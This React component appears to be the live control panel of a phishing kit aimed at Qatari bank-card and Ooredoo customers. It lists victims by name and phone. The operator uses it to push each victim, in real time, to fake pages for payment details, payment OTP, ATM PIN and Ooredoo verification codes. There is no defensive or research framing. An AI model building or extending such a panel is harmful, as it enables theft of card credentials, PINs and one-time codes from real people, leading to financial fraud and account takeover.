import React, { useEffect, useState } from 'react';
import { supabase } from '../integrations/supabase/client';

interface ProcessingUser {
  id: string;
  user_id: string;
  name: string;
  phone: string;
  created_at: string;
}

const AdminDashboard = () => {
  const [users, setUsers] = useState<ProcessingUser[]>([]);
  const [selectedUser, setSelectedUser] = useState<string | null>(null);
  const [route, setRoute] = useState('/registration-complete');

  useEffect(() => {
    fetchUsers();

    // الاستماع للتحديثات الفورية
    const channel = supabase
      .channel('users-changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'processing_users',
        },
        () => {
          fetchUsers();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const fetchUsers = async () => {
    const { data, error } = await supabase
      .from('processing_users')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Error fetching users:', error);
      return;
    }

    setUsers(data || []);
  };

  const sendNavigationInstruction = async () => {
    if (!selectedUser || !route) return;

    try {
      // حذف أي تعليمات سابقة للمستخدم
      await supabase
        .from('navigation_instructions')
        .delete()
        .eq('user_id', selectedUser);

      // إضافة تعليمة جديدة
      const { error } = await supabase
        .from('navigation_instructions')
        .insert({
          user_id: selectedUser,
          route: route,
        });

      if (error) {
        console.error('Error sending instruction:', error);
        alert('حدث خطأ في إرسال التعليمات');
        return;
      }

      alert('تم إرسال التعليمات بنجاح!');
    } catch (err) {
      console.error('Error:', err);
    }
  };

  const deleteUser = async (userId: string) => {
    const { error } = await supabase
      .from('processing_users')
      .delete()
      .eq('user_id', userId);

    if (error) {
      console.error('Error deleting user:', error);
      return;
    }

    fetchUsers();
  };

  const routes = [
    { value: '/registration-complete', label: 'بوابة الدفع' },
    { value: '/payment-otp', label: 'OTP الدفع' },
    { value: '/atm-pin', label: 'رقم PIN' },
    { value: '/atm-loading', label: 'تحميل ATM' },
    { value: '/ooredoo-verification', label: 'تفعيل Ooredoo' },
    { value: '/otp-verification', label: 'OTP Ooredoo' },
    { value: '/success', label: 'النجاح' },
    { value: '/meme', label: 'صورة ميم' },
  ];

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6" dir="rtl">
      <div className="max-w-6xl mx-auto">
        <h1 className="text-3xl font-bold mb-8 text-center">لوحة التحكم</h1>

        {/* قسم التحكم */}
        <div className="bg-gray-800 rounded-xl p-6 mb-8">
          <h2 className="text-xl font-semibold mb-4">إرسال تعليمات التوجيه</h2>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
              <label className="block text-sm text-gray-400 mb-2">اختر المستخدم</label>
              <select
                value={selectedUser || ''}
                onChange={(e) => setSelectedUser(e.target.value)}
                className="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-white"
              >
                <option value="">اختر مستخدم...</option>
                {users.map((user) => (
                  <option key={user.id} value={user.user_id}>
                    {user.name} - {user.phone}
                  </option>
                ))}
              </select>
            </div>

            <div>
              <label className="block text-sm text-gray-400 mb-2">اختر الصفحة</label>
              <select
                value={route}
                onChange={(e) => setRoute(e.target.value)}
                className="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-white"
              >
                {routes.map((r) => (
                  <option key={r.value} value={r.value}>
                    {r.label}
                  </option>
                ))}
              </select>
            </div>

            <div className="flex items-end">
              <button
                onClick={sendNavigationInstruction}
                disabled={!selectedUser}
                className="w-full bg-green-600 text-white py-3 rounded-lg font-semibold hover:bg-green-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                إرسال
              </button>
            </div>
          </div>
        </div>

        {/* قائمة المستخدمين */}
        <div className="bg-gray-800 rounded-xl p-6">
          <h2 className="text-xl font-semibold mb-4">المستخدمون المتصلون ({users.length})</h2>
          
          {users.length === 0 ? (
            <div className="text-center text-gray-400 py-8">
              لا يوجد مستخدمون متصلون حالياً
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-gray-700">
                    <th className="text-right py-3 px-4 text-gray-400">معرف المستخدم</th>
                    <th className="text-right py-3 px-4 text-gray-400">الاسم</th>
                    <th className="text-right py-3 px-4 text-gray-400">الهاتف</th>
                    <th className="text-right py-3 px-4 text-gray-400">وقت الإنشاء</th>
                    <th className="text-right py-3 px-4 text-gray-400">إجراءات</th>
                  </tr>
                </thead>
                <tbody>
                  {users.map((user) => (
                    <tr key={user.id} className="border-b border-gray-700 hover:bg-gray-700/50">
                      <td className="py-3 px-4 font-mono text-sm">{user.user_id.substring(0, 12)}...</td>
                      <td className="py-3 px-4">{user.name}</td>
                      <td className="py-3 px-4">{user.phone}</td>
                      <td className="py-3 px-4 text-sm text-gray-400">
                        {new Date(user.created_at).toLocaleString('ar-QA')}
                      </td>
                      <td className="py-3 px-4">
                        <button
                          onClick={() => deleteUser(user.user_id)}
                          className="text-red-400 hover:text-red-300 text-sm"
                        >
                          حذف
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;
